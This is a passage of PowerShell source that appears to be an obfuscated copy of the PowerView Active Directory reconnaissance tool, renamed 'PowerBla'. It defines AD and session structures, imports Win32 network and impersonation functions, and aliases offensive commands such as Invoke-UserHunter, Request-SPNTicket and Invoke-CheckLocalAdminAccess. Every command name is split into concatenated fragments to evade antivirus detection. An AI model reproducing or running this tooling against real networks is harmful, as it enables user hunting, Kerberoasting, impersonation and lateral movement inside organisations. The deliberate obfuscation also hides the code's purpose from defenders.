    NON_SECURITY_GROUP_OBJECT       =   ('0x1'+'00'+'00'+'001')
    ALIAS_OBJECT                    =   ('0x'+'2'+'0000000')
    NON_SECURITY_ALIAS_OBJECT       =   ('0x200'+'000'+'01')
    USER_OBJECT                     =   ('0'+'x30000'+'000')
    MACHINE_ACCOUNT                 =   ('0'+'x300'+'0'+'0001')
    TRUST_ACCOUNT                   =   ('0'+'x3'+'0000'+'002')
    APP_BASIC_GROUP                 =   ('0x400'+'00'+'000')
    APP_QUERY_GROUP                 =   ('0'+'x4000'+'000'+'1')
    ACCOUNT_TYPE_MAX                =   ('0x'+'7f'+'ffffff')
}

$GroupTypeEnum = &('psenu'+'m') $Mod PowerBla.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   ('0x000'+'000'+'01')
    GLOBAL_SCOPE                    =   ('0'+'x0000'+'00'+'02')
    DOMAIN_LOCAL_SCOPE              =   ('0x'+'0000'+'0004')
    UNIVERSAL_SCOPE                 =   ('0x000'+'000'+'08')
    APP_BASIC                       =   ('0x'+'00'+'00'+'0010')
    APP_QUERY                       =   ('0x'+'0'+'0000020')
    SECURITY                        =   ('0x80'+'00'+'0000')
} -Bitfield

$UACEnum = &('p'+'senum') $Mod PowerBla.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

$WTSConnectState = &('p'+'senu'+'m') $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

$WTS_SESSION_INFO_1 = &('st'+'ruc'+'t') $Mod PowerBla.RDPSessionInfo @{
    ExecEnvId = &('fi'+'eld') 0 UInt32
    State = &('fi'+'eld') 1 $WTSConnectState
    SessionId = &('fiel'+'d') 2 UInt32
    pSessionName = &('fi'+'eld') 3 String -MarshalAs @(('LP'+'WStr'))
    pHostName = &('fie'+'ld') 4 String -MarshalAs @(('L'+'PWStr'))
    pUserName = &('fie'+'ld') 5 String -MarshalAs @(('L'+'PWStr'))
    pDomainName = &('fi'+'eld') 6 String -MarshalAs @(('L'+'PWSt'+'r'))
    pFarmName = &('f'+'ield') 7 String -MarshalAs @(('LPW'+'Str'))
}

$WTS_CLIENT_ADDRESS = &('str'+'uc'+'t') $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = &('fi'+'eld') 0 UInt32
    Address = &('f'+'ield') 1 Byte[] -MarshalAs @(('By'+'V'+'alArray'), 20)
}

$SHARE_INFO_1 = &('str'+'uct') $Mod PowerBla.ShareInfo @{
    Name = &('f'+'ield') 0 String -MarshalAs @(('LP'+'WS'+'tr'))
    Type = &('fiel'+'d') 1 UInt32
    Remark = &('fiel'+'d') 2 String -MarshalAs @(('LPWSt'+'r'))
}

$WKSTA_USER_INFO_1 = &('s'+'truct') $Mod PowerBla.LoggedOnUserInfo @{
    UserName = &('f'+'ield') 0 String -MarshalAs @(('LPWSt'+'r'))
    LogonDomain = &('f'+'ield') 1 String -MarshalAs @(('L'+'PWStr'))
    AuthDomains = &('f'+'ield') 2 String -MarshalAs @(('LPW'+'S'+'tr'))
    LogonServer = &('fiel'+'d') 3 String -MarshalAs @(('LPWSt'+'r'))
}

$SESSION_INFO_10 = &('str'+'uct') $Mod PowerBla.SessionInfo @{
    CName = &('fiel'+'d') 0 String -MarshalAs @(('LPW'+'S'+'tr'))
    UserName = &('fiel'+'d') 1 String -MarshalAs @(('LPWS'+'tr'))
    Time = &('fie'+'ld') 2 UInt32
    IdleTime = &('fie'+'ld') 3 UInt32
}

$SID_NAME_USE = &('ps'+'enu'+'m') $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

$LOCALGROUP_INFO_1 = &('stru'+'ct') $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = &('f'+'ield') 0 String -MarshalAs @(('LPW'+'Str'))
    lgrpi1_comment = &('fi'+'eld') 1 String -MarshalAs @(('LPWS'+'tr'))
}

$LOCALGROUP_MEMBERS_INFO_2 = &('st'+'ruc'+'t') $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = &('fiel'+'d') 0 IntPtr
    lgrmi2_sidusage = &('fi'+'eld') 1 $SID_NAME_USE
    lgrmi2_domainandname = &('fie'+'ld') 2 String -MarshalAs @(('LP'+'WStr'))
}

$DsDomainFlag = &('p'+'sen'+'um') $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = &('psenu'+'m') $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = &('psen'+'um') $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

$DS_DOMAIN_TRUSTS = &('st'+'ruct') $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = &('f'+'ield') 0 String -MarshalAs @(('LPW'+'Str'))
    DnsDomainName = &('fi'+'eld') 1 String -MarshalAs @(('L'+'PW'+'Str'))
    Flags = &('fi'+'eld') 2 $DsDomainFlag
    ParentIndex = &('fie'+'ld') 3 UInt32
    TrustType = &('f'+'ield') 4 $DsDomainTrustType
    TrustAttributes = &('fiel'+'d') 5 $DsDomainTrustAttributes
    DomainSid = &('fie'+'ld') 6 IntPtr
    DomainGuid = &('f'+'ield') 7 Guid
}

$NETRESOURCEW = &('s'+'truct') $Mod NETRESOURCEW @{
    dwScope =         &('f'+'ield') 0 UInt32
    dwType =          &('fiel'+'d') 1 UInt32
    dwDisplayType =   &('fi'+'eld') 2 UInt32
    dwUsage =         &('fiel'+'d') 3 UInt32
    lpLocalName =     &('fiel'+'d') 4 String -MarshalAs @(('L'+'PWS'+'tr'))
    lpRemoteName =    &('fiel'+'d') 5 String -MarshalAs @(('LPWS'+'tr'))
    lpComment =       &('fiel'+'d') 6 String -MarshalAs @(('LPW'+'St'+'r'))
    lpProvider =      &('f'+'ield') 7 String -MarshalAs @(('L'+'PWSt'+'r'))
}

$FunctionDefinitions = @(
    (&('f'+'unc') netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&('fu'+'nc') netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&('f'+'unc') netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&('fun'+'c') netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&('fu'+'nc') netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (&('fu'+'nc') netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (&('fu'+'nc') netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (&('fun'+'c') netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (&('fun'+'c') advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (&('fu'+'nc') advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&('f'+'unc') advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (&('f'+'unc') advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (&('fu'+'nc') advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (&('fu'+'nc') advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (&('f'+'unc') wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (&('fu'+'nc') wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (&('fu'+'nc') wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (&('f'+'unc') wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (&('fu'+'nc') wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (&('fu'+'nc') wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (&('fu'+'nc') Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (&('f'+'unc') Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (&('fu'+'nc') kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | &('Add-Wi'+'n3'+'2Ty'+'pe') -Module $Mod -Namespace ('Wi'+'n32')
$Netapi32 = $Types[('ne'+'tapi3'+'2')]
$Advapi32 = $Types[('adv'+'a'+'pi32')]
$Wtsapi32 = $Types[('wtsapi'+'3'+'2')]
$Mpr = $Types[('Mp'+'r')]
$Kernel32 = $Types[('kernel'+'3'+'2')]

&('Set'+'-Alia'+'s') Get-IPAddress Resolve-IPAddress
&('Se'+'t-Alias') Convert-NameToSid ConvertTo-SID
&('S'+'et-Alias') Convert-SidToName ConvertFrom-SID
&('Set'+'-Alia'+'s') Request-SPNTicket Get-DomainSPNTicket
&('S'+'et'+'-'+'Alias') Get-DNSZone Get-DomainDNSZone
&('Se'+'t-Al'+'ias') Get-DNSRecord Get-DomainDNSRecord
&('Set-A'+'li'+'as') Get-NetDomain Get-Domain
&('Se'+'t-Alia'+'s') Get-NetDomainController Get-DomainController
&('Se'+'t'+'-'+'Alias') Get-NetForest Get-Forest
&('Set'+'-Al'+'ias') Get-NetForestDomain Get-ForestDomain
&('S'+'et-Al'+'ias') Get-NetForestCatalog Get-ForestGlobalCatalog
&('S'+'et'+'-Alias') Get-NetUser Get-DomainUser
&('Set-Al'+'ia'+'s') Get-UserEvent Get-DomainUserEvent
&('S'+'et'+'-'+'Alias') Get-NetComputer Get-DomainComputer
&('Se'+'t-Ali'+'as') Get-ADObject Get-DomainObject
&('Se'+'t'+'-Alias') Set-ADObject Set-DomainObject
&('Se'+'t-Ali'+'as') Get-ObjectAcl Get-DomainObjectAcl
&('Set-'+'Ali'+'a'+'s') Add-ObjectAcl Add-DomainObjectAcl
&('Set-Ali'+'a'+'s') Invoke-ACLScanner Find-InterestingDomainAcl
&('Se'+'t-Ali'+'as') Get-GUIDMap Get-DomainGUIDMap
&('Set'+'-Ali'+'as') Get-NetOU Get-DomainOU
&('Se'+'t-'+'Alia'+'s') Get-NetSite Get-DomainSite
&('Se'+'t'+'-Alias') Get-NetSubnet Get-DomainSubnet
&('Set'+'-Al'+'ias') Get-NetGroup Get-DomainGroup
&('Set-A'+'l'+'ias') Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
&('S'+'e'+'t-Alias') Get-NetGroupMember Get-DomainGroupMember
&('Set-Al'+'ia'+'s') Get-NetFileServer Get-DomainFileServer
&('Set'+'-A'+'lias') Get-DFSshare Get-DomainDFSShare
&('Set-Al'+'ia'+'s') Get-NetGPO Get-DomainGPO
&('Set-A'+'l'+'ias') Get-NetGPOGroup Get-DomainGPOLocalGroup
&('Se'+'t-Alias') Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
&('Set-A'+'lia'+'s') Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
&('Set'+'-Alia'+'s') Get-LoggedOnLocal Get-RegLoggedOn
&('S'+'et-'+'Alias') Invoke-CheckLocalAdminAccess Test-AdminAccess
&('Set-Ali'+'a'+'s') Get-SiteName Get-NetComputerSiteName
&('Set'+'-'+'Alias') Get-Proxy Get-WMIRegProxy
&('Set'+'-'+'Alias') Get-LastLoggedOn Get-WMIRegLastLoggedOn
&('S'+'et-Al'+'ias') Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
&('Set-'+'Al'+'ias') Get-RegistryMountedDrive Get-WMIRegMountedDrive
&('S'+'et-Al'+'i'+'as') Get-NetProcess Get-WMIProcess
&('S'+'et-A'+'lias') Invoke-ThreadedFunction New-ThreadedFunction
&('Set-'+'Alia'+'s') Invoke-UserHunter Find-DomainUserLocation
&('Set-Ali'+'a'+'s') Invoke-ProcessHunter Find-DomainProcess
&('Set'+'-'+'Alias') Invoke-EventHunter Find-DomainUserEvent
&('Set-'+'A'+'li'+'as') Invoke-ShareFinder Find-DomainShare
&('Se'+'t-A'+'li'+'as') Invoke-FileFinder Find-InterestingDomainShareFile
&('Set'+'-Ali'+'as') Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
&('Se'+'t'+'-Alias') Get-NetDomainTrust Get-DomainTrust
&('S'+'et-Al'+'i'+'as') Get-NetForestTrust Get-ForestTrust
&('Set-Ali'+'a'+'s') Find-ForeignUser Get-DomainForeignUser
&('Set-Ali'+'as') Find-ForeignGroup Get-DomainForeignGroupMember
&('Se'+'t-Al'+'ias') Invoke-MapDomainTrust Get-DomainTrustMapping
&('Set-'+'Al'+'ias') Get-DomainPolicy Get-DomainPolicyData


